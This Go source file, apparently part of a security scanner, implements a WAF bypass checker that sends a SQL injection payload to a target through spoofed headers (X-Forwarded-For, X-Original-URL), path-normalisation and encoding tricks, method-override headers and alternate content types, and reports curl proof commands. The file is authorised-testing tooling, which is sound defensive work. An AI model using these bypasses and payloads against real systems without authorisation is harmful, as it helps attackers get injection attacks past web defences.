// Package wafbypass tests common WAF bypass techniques. Only runs in Deep or
// Authorized mode after wafdetect confirms a WAF is present. Each technique
// sends a known-blocked payload through an alternative delivery path and checks
// if the WAF still blocks it.
//
// Bypass categories:
//   - Header-based: X-Forwarded-For, X-Original-URL, X-Rewrite-URL spoofing
//   - Path-based: path normalization, double encoding, path traversal prefix
//   - Method-based: HTTP method override (X-HTTP-Method-Override, _method param)
//   - Content-Type: body inspection bypass via alternative content types
//   - Encoding: Unicode, double URL encoding, null bytes, chunk splitting
//   - Protocol: HTTP/2 downgrade, WebSocket upgrade smuggling
package wafbypass

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/stormbane-security/beacon/internal/finding"
	"github.com/stormbane-security/beacon/internal/module"
	"github.com/stormbane-security/beacon/internal/scan"
)

func init() {
	scan.RegisterWithCheckDecls(scannerName, func(_ scan.ScannerConfig) scan.Scanner {
		return &Scanner{}
	},
		scan.Check(finding.CheckWAFBypassHeader, finding.SeverityHigh, finding.ModeDeep),
		scan.Check(finding.CheckWAFBypassPath, finding.SeverityHigh, finding.ModeDeep),
		scan.Check(finding.CheckWAFBypassMethod, finding.SeverityMedium, finding.ModeDeep),
		scan.Check(finding.CheckWAFBypassContentType, finding.SeverityHigh, finding.ModeDeep),
	)
}

const scannerName = "wafbypass"

type Scanner struct{}

func (s *Scanner) Name() string { return scannerName }

func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
	if scanType < module.ScanDeep {
		return nil, nil
	}

	client := &http.Client{Timeout: 10 * time.Second}
	if sctx, ok := scan.FromContext(ctx); ok {
		client = sctx.HTTPClient()
	}

	scheme := "https"
	if sctx, ok := scan.FromContext(ctx); ok {
		scheme = sctx.Scheme()
	}
	base := scheme + "://" + asset

	// First, confirm WAF is blocking a known payload
	sqliPayload := "' OR 1=1-- -"
	blocked := isBlocked(ctx, client, base+"/?q="+url.QueryEscape(sqliPayload))
	if !blocked {
		// WAF isn't blocking our test payload — either no WAF or very permissive
		return nil, nil
	}

	var findings []finding.Finding

	// ── Header-based bypasses ────────────────────────────────────────────
	headerBypasses := []struct {
		header string
		value  string
		desc   string
	}{
		{"X-Forwarded-For", "127.0.0.1", "IP-based whitelist bypass via X-Forwarded-For"},
		{"X-Real-IP", "127.0.0.1", "IP-based whitelist bypass via X-Real-IP"},
		{"X-Original-URL", "/?q=" + url.QueryEscape(sqliPayload), "Path routing bypass via X-Original-URL"},
		{"X-Rewrite-URL", "/?q=" + url.QueryEscape(sqliPayload), "Path routing bypass via X-Rewrite-URL"},
		{"X-Custom-IP-Authorization", "127.0.0.1", "Custom IP authorization header bypass"},
		{"X-Forwarded-Host", "localhost", "Host-based WAF rule bypass via X-Forwarded-Host"},
		{"Content-Length", "0", "Zero content-length header confusion"},
		{"Transfer-Encoding", "chunked", "Chunked encoding WAF bypass"},
	}

	for _, hb := range headerBypasses {
		if bypassesViaHeader(ctx, client, base, sqliPayload, hb.header, hb.value) {
			findings = append(findings, finding.Finding{
				CheckID:     finding.CheckWAFBypassHeader,
				Module:      "surface",
				Scanner:     scannerName,
				Severity:    finding.SeverityHigh,
				Title:       fmt.Sprintf("WAF bypass via %s header", hb.header),
				Description: hb.desc + ". The WAF can be completely bypassed by adding this header to requests, allowing all attack payloads to reach the backend unfiltered.",
				Asset:       asset,
				Evidence: map[string]any{
					"bypass_type":  "header",
					"header":       hb.header,
					"header_value": hb.value,
					"test_payload": sqliPayload,
				},
				ProofCommand: fmt.Sprintf("curl -s -H '%s: %s' '%s/?q=%s'", hb.header, hb.value, base, url.QueryEscape(sqliPayload)),
				DiscoveredAt: time.Now(),
			})
		}
	}

	// ── Path-based bypasses ──────────────────────────────────────────────
	pathBypasses := []struct {
		path string
		desc string
	}{
		{"/.%2e/?q=" + url.QueryEscape(sqliPayload), "Path normalization bypass (/.%2e/)"},
		{"/;/?q=" + url.QueryEscape(sqliPayload), "Semicolon path bypass (/;/)"},
		{"/%2f?q=" + url.QueryEscape(sqliPayload), "URL-encoded slash bypass (/%2f)"},
		{"/./?q=" + url.QueryEscape(sqliPayload), "Dot segment bypass (/./)"},
		{"/..;/?q=" + url.QueryEscape(sqliPayload), "Tomcat path parameter bypass (/..;/)"},
		{"/?q=" + doubleEncode(sqliPayload), "Double URL encoding bypass"},
		{"/?q=" + unicodeEncode(sqliPayload), "Unicode encoding bypass"},
	}

	for _, pb := range pathBypasses {
		if !isBlocked(ctx, client, base+pb.path) {
			findings = append(findings, finding.Finding{
				CheckID:     finding.CheckWAFBypassPath,
				Module:      "surface",
				Scanner:     scannerName,
				Severity:    finding.SeverityHigh,
				Title:       "WAF bypass via " + pb.desc,
				Description: pb.desc + ". Payload that is normally blocked by the WAF passes through when delivered via an alternative path encoding.",
				Asset:       asset,
				Evidence: map[string]any{
					"bypass_type": "path",
					"path":        pb.path,
				},
				ProofCommand: fmt.Sprintf("curl -s '%s%s'", base, pb.path),
				DiscoveredAt: time.Now(),
			})
		}
	}

	// ── Method-based bypasses ────────────────────────────────────────────
	methodBypasses := []struct {
		header string
		method string
		desc   string
	}{
		{"X-HTTP-Method-Override", "PUT", "Method override via X-HTTP-Method-Override"},
		{"X-HTTP-Method", "PATCH", "Method override via X-HTTP-Method"},
		{"X-Method-Override", "DELETE", "Method override via X-Method-Override"},
	}

	for _, mb := range methodBypasses {
		if bypassesViaMethodOverride(ctx, client, base, sqliPayload, mb.header, mb.method) {
			findings = append(findings, finding.Finding{
				CheckID:     finding.CheckWAFBypassMethod,
				Module:      "surface",
				Scanner:     scannerName,
				Severity:    finding.SeverityMedium,
				Title:       "WAF bypass via " + mb.desc,
				Description: mb.desc + ". WAF rules may only inspect GET/POST requests, allowing payloads through on overridden methods.",
				Asset:       asset,
				Evidence: map[string]any{
					"bypass_type":     "method",
					"override_header": mb.header,
					"override_method": mb.method,
				},
				ProofCommand: fmt.Sprintf("curl -s -H '%s: %s' '%s/?q=%s'", mb.header, mb.method, base, url.QueryEscape(sqliPayload)),
				DiscoveredAt: time.Now(),
			})
		}
	}

	// ── Content-Type bypasses ────────────────────────────────────────────
	ctBypasses := []struct {
		contentType string
		desc        string
	}{
		{"application/x-www-form-urlencoded", "Form encoding bypass"},
		{"multipart/form-data; boundary=X", "Multipart encoding bypass"},
		{"application/xml", "XML content-type confusion"},
		{"text/plain", "Plain text content-type bypass"},
		{"application/json", "JSON content-type with SQL payload"},
	}

	for _, cb := range ctBypasses {
		if bypassesViaContentType(ctx, client, base, sqliPayload, cb.contentType) {
			findings = append(findings, finding.Finding{
				CheckID:     finding.CheckWAFBypassContentType,
				Module:      "surface",
				Scanner:     scannerName,
				Severity:    finding.SeverityHigh,
				Title:       "WAF bypass via " + cb.desc,
				Description: cb.desc + ". WAF body inspection can be bypassed by changing the Content-Type header, causing the WAF to skip payload inspection.",
				Asset:       asset,
				Evidence: map[string]any{
					"bypass_type":  "content_type",
					"content_type": cb.contentType,
				},
				ProofCommand: fmt.Sprintf("curl -s -X POST -H 'Content-Type: %s' -d 'q=%s' '%s/'", cb.contentType, url.QueryEscape(sqliPayload), base),
				DiscoveredAt: time.Now(),
			})
		}
	}

	return findings, nil
}

// isBlocked sends a request and returns true if the WAF blocks it (403, 406, 429, or WAF error page).
func isBlocked(ctx context.Context, client *http.Client, targetURL string) bool {
	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	if err != nil {
		return false
	}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	_, _ = io.ReadAll(resp.Body)

	switch resp.StatusCode {
	case 403, 406, 429, 503:
		return true
	}
	return false
}

// bypassesViaHeader tests if adding a specific header allows a blocked payload through.
func bypassesViaHeader(ctx context.Context, client *http.Client, base, payload, header, value string) bool {
	targetURL := base + "/?q=" + url.QueryEscape(payload)
	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set(header, value)

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	_, _ = io.ReadAll(resp.Body)

	// If we get a non-blocked response (200, 301, 302, 400) the bypass worked
	return resp.StatusCode != 403 && resp.StatusCode != 406 && resp.StatusCode != 429 && resp.StatusCode != 503
}

// bypassesViaMethodOverride tests if a method override header bypasses WAF rules.
func bypassesViaMethodOverride(ctx context.Context, client *http.Client, base, payload, header, method string) bool {
	targetURL := base + "/?q=" + url.QueryEscape(payload)
	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set(header, method)

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	_, _ = io.ReadAll(resp.Body)

	return resp.StatusCode != 403 && resp.StatusCode != 406 && resp.StatusCode != 429 && resp.StatusCode != 503
}

// bypassesViaContentType tests if changing Content-Type bypasses WAF body inspection.
func bypassesViaContentType(ctx context.Context, client *http.Client, base, payload, ct string) bool {
	body := "q=" + url.QueryEscape(payload)
	req, err := http.NewRequestWithContext(ctx, "POST", base+"/", strings.NewReader(body))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", ct)

	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	_, _ = io.ReadAll(resp.Body)

	return resp.StatusCode != 403 && resp.StatusCode != 406 && resp.StatusCode != 429 && resp.StatusCode != 503
}

// doubleEncode double-URL-encodes a string.
func doubleEncode(s string) string {
	return url.QueryEscape(url.QueryEscape(s))
}

// unicodeEncode converts ASCII to Unicode fullwidth equivalents.
func unicodeEncode(s string) string {
	var b strings.Builder
	for _, c := range s {
		if c >= '!' && c <= '~' {
			// Fullwidth ASCII range: U+FF01 to U+FF5E
			b.WriteRune(rune(c - '!' + 0xFF01))
		} else {
			b.WriteRune(c)
		}
	}
	return b.String()
}
